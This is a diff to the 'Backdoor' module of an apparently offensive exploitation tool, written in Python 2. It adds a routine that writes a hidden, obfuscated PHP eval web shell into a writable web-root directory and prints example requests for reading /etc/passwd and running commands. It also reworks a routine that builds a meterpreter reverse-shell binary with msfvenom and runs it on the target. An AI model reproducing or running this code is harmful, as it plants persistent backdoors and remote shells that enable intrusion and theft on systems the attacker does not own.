@@ -5,6 +5,8 @@ from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
 from core.modules.shell_handler import linux
 
+import random, string
+
 
 # Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
 class Backdoor(object):
@@ -21,7 +23,8 @@ class Backdoor(object):
         print '[i] \t*msf    \t\tUse a PHP metereter to create a reverse shell'
         print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat openbsd)'
         print '[i] \t*perl   \t\tUse perl to create a reverse shell'
-        #print '[i] \t*php    \t\tUse php-cli to create a reverse shell'
+        print '[i] \tphp    \t\t\tAttempt to write a PHP file into the web root directory'
+        #print '[i] \t*php-cli    \t\tUse php-cli to create a reverse shell'
         print '[i] \t*python \t\tUse python to create a reverse shell'
         print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
         print '[i] \tspread  \t\tSpread our shell around'
@@ -41,16 +44,15 @@ class Backdoor(object):
             print '\n{0}[i] Found the metasploit framework!'.format(Colors.GREEN, Colors.END)
             folder = linux.get_writble_dir()
             if folder:
-                import random, string
-                filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-                exe = '{0}/{1}'.format(folder, filename)
-                print '\n{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+                filename = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))
+                print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+                path = '{0}/{1}'.format(folder, filename)
                 raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
                 print '[i] Generating linux/x86/meterpreter/reverse_tcp'
                 #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, exe)
-                print '\n{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
+                cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
+                print '{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
                 make_request.get_page_source(cmd)
                 print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
@@ -100,7 +102,39 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find perl on the remote system{1}'.format(Colors.RED, Colors.END)
 
-    def php(self, ip, port):
+    def php(self, ip):
+        wwwroot = linux.get_doc_root()
+        cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)       # Ths could be put into a function? this/spread/get_writble_dir
+        folder = make_request.get_page_source(cmd)
+        if folder:
+            folder = folder[0]
+            print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
+            filename = '.'+''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))+'.php'     # Ths could be put into a function? Snap! (<--with msf)
+            print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
+            path = '{0}/{1}'.format(folder, filename)
+            
+            print '{0}[+] Creating our \'evil\' file: \'{1}\'{2}'.format(Colors.GREEN, path, Colors.END)
+            parameter = ''.join(random.choice(string.ascii_lowercase) for x in range(6))
+            #  1) cmd = 'echo "<?php @eval(\$_GET[\'cmd\'].\';\'); ?>" > "{0}"'.format(path)        # 'Standard' with fix parameter
+            #2.1) payload = 'echo "@eval(\$_GET[\'{0}\'].\';\');" | base64'.format(parameter)       # 'Standard with random parameter
+            #2.2) cmd = 'echo "<?php eval(base64_decode("{0}" ?>" > "{1}"'.format(payload, path)    
+            import base64, itertools                                                                # 'Encoded with random parameter and alting cases
+            casePayload=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'eval'))))
+            caseShell=random.choice(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in 'php eval(base64_decode'))))
+            payload = "{0}($_GET['{1}'].';');".format(casePayload, parameter)
+            payloadEncoded = base64.b64encode(payload).format(payload)
+            evilFile= "<?{0}(\"{1}\")); ?>".format(caseShell, payloadEncoded)
+            cmd = 'echo \'{0}\' > \"{1}\"'.format(evilFile, path)
+            make_request.get_page_source(cmd)
+            
+            print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
+            
+            uri = folder[len(wwwroot):]
+            print '{0}[i] Example:\n[i]\tcurl "{1}{2}/{3}?{4}=require(\'/etc/passwd\')"\n[i]\tcurl "{1}{2}/{3}?{4}=system(\'/sbin/ifconfig\')"{5}'.format(Colors.GREEN, ip, uri, filename, parameter, Colors.END)  # Needs to search, http & https
+        else:
+            print '\n{0}[!] Unable to find a wriable directory'.format(Colors.RED, Colors.END)
+
+    def php_cli(self, ip, port):
         cmd = "for x in `whereis php`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         php = make_request.get_page_source(cmd)
         if php:
